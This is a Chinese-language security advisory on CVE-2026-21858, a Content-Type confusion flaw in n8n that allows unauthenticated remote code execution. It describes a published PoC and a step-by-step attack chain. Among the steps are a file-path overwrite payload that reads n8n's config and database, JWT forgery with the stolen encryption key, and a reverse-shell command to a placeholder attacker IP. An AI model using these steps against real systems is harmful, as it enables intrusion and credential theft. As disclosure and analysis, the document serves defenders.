## CVE-2026-21858 - n8n Content-Type混淆导致远程代码执行

**漏洞编号:** CVE-2026-21858

**漏洞类型:** Content-Type混淆导致远程代码执行

**影响应用:** n8n

**危害等级:** 高危

**CVSS评分:** 10.0

**影响版本:** 1.65.0 至 1.121.0 之间

**利用条件:** 无需认证，远程网络访问，需存在公开的表单或Webhook端点

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 0%

## 详情

CVE-2026-21858（代号“Ni8mare”）是n8n开源低代码工作流自动化工具中发现的一个最高严重性漏洞，允许未经身份验证的远程攻击者完全控制受影响的n8n实例。该漏洞的核心在于n8n表单(Form)节点在处理HTTP请求时，未能正确验证`Content-Type`头部，导致攻击者可通过类型混淆覆盖`req.body.files`对象，从而操纵文件路径参数，最终实现任意文件读取、会话伪造和远程代码执行（RCE）。由于n8n通常存储并代理API令牌、OAuth凭证、数据库访问权限和云密钥，一旦失陷，攻击者可以迅速以此为跳板，渗透到更广泛的企业基础设施中。

**POC有效性分析**
所提供的`ATTACKVECTOR.md`文档提供了一个详尽且技术性强的CVE-2026-21858漏洞完整攻击链描述。该文档详细阐述了从侦察到最终远程代码执行的五个阶段，包括侦察与发现、武器化（Content-Type混淆）、数据窃取（任意文件读取）、利用（会话伪造）和安装（通过工作流RCE）。文档中不仅明确指出了`parseRequestBody()`和`prepareFormReturnItem()`等关键易受攻击函数，还提供了具体的JSON payload示例（例如`{"filepath": "/home/node/.n8n/config", "mimetype": "application/json", "filename": "pwn.json"}`）、目标敏感文件（`config`、`database.sqlite`）以及反向Shell命令。文档精确地分析了漏洞的根本原因，即“不安全的输入处理”、“缺少验证”和对静态加密密钥的“隐式信任”。这种从根源漏洞到多阶段利用直至完全系统接管的逻辑流是清晰、连贯且技术上合理的。尽管该POC本身是一个描述性文档而非可执行脚本，但其详尽的技术细节和一步步的指导足以让具备一定安全知识的用户理解并复现漏洞。它有效地传达了漏洞利用的复杂性，并为构建实际的攻击工具提供了完整的蓝图，因此被评价为高质量的完整利用POC。

**利用步骤**
1.  **侦察与发现**：攻击者利用搜索引擎（如Shodan/Censys）搜索暴露在互联网上的n8n实例，识别标题或HTML中包含“n8n”的服务器。随后，通过检查HTTP头部或静态文件来识别活跃的Webhook或Form Webhook节点，并指纹识别n8n版本，以确认其处于1.65.0到1.121.0的受影响范围内。
2.  **武器化 (Content-Type混淆)**：攻击者利用`parseRequestBody()`函数在处理HTTP请求时未能正确区分`multipart/form-data`和`application/json`负载的缺陷。向预期接收文件上传的Webhook端点发送一个特制的JSON payload。此payload会巧妙地构造并覆盖`req.body.files`对象的`filepath`参数，将其指向系统中的任意路径，例如`[{"filepath": "/home/node/.n8n/config", "mimetype": "application/json", "filename": "pwn.json"}]`，使得n8n系统错误地将用户定义的文件路径识别为新上传的文件。
3.  **数据窃取 (任意文件读取)**：利用`prepareFormReturnItem()`函数会将通过混淆注入的文件路径（例如`/home/node/.n8n/config`或`/home/node/.n8n/database.sqlite`）复制到n8n的一个公共可访问文件夹中。攻击者通过访问该公共文件夹，可以窃取包含系统加密密钥`N8N_ENCRYPTION_KEY`的`config`文件以及包含用户哈希的`database.sqlite`文件，从而获取敏感信息。
4.  **会话伪造**: 攻击者利用窃取的`N8N_ENCRYPTION_KEY`作为签名密钥，使用HS256算法生成一个有效的JSON Web Token (JWT)。将伪造的JWT作为`n8n-auth` cookie注入浏览器或请求中，成功绕过n8n的身份验证机制，直接获得Owner/Admin管理权限。
5.  **远程代码执行 (RCE)**：获得管理员权限后，攻击者利用n8n的REST API自动化创建一个新的工作流。该工作流中包含一个“Execute Command”或“Code Node (Node.js)”节点，攻击者在此节点中插入恶意命令，例如一个反向Shell (`/bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"`)，从而在n8n实例上实现远程代码执行，获得服务器的完全控制权。
6.  **横向移动**: 如果n8n实例运行在特权模式的Docker容器中，攻击者可能进一步尝试进行Docker逃逸。如果n8n部署在云平台（如AWS/GCP）上，攻击者还可以窃取云元数据凭据，从而扩大攻击范围，渗透到更广泛的企业基础设施中。

**投毒风险分析**
所提供的POC内容是一个名为`ATTACKVECTOR.md`的Markdown文档，其本质是一个详细的攻击指南和技术分析报告，而非可直接执行的软件或脚本。该文档以纯文本形式描述了CVE-2026-21858漏洞的完整攻击链、利用原理、具体步骤、示例payload和命令。文档中所有提及的JSON payload、反向Shell命令等均为漏洞利用的典型示例，旨在说明攻击者如何实现RCE，属于技术分析的范畴。这些内容是用于复现和理解漏洞的关键信息，不应被视为“投毒”代码。

由于该POC是一个非可执行的描述性文档，它不包含任何可被混淆、注入恶意代码或利用自身执行机制进行投毒的环节。它不涉及调用外部脚本、使用`eval()`函数、执行可疑的网络请求或依赖不安全的第三方库。因此，从POC文档本身的安全性角度来看，其投毒风险为**0%**。使用者在依据该文档手动复现漏洞时，应确保环境安全，并对自行编写或使用的任何脚本进行严格审查，以避免因其他来源的恶意代码而引入风险。但就`ATTACKVECTOR.md`这份POC文档而言，其内容清晰、透明，不存在任何隐藏的恶意意图或可被利用的投毒点。

**项目地址:** https://github.com/Chocapikk/CVE-2026-21858

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2026-21858
